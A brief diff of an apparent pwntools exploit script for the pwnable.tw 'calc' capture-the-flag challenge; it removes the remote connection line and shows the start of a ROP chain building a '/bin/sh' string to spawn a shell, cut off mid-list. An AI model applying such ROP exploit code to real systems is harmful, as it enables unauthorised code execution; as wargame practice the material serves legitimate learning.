@@ -1,6 +1,5 @@
 from pwn import *
 #io = process('./calc')
-io = remote('chall.pwnable.tw', 10100)
 pause()
 
 ropchain = [0x080701aa, 0x080ec060, 0x0805c34b, int('nib/'.encode('hex'), 16), 
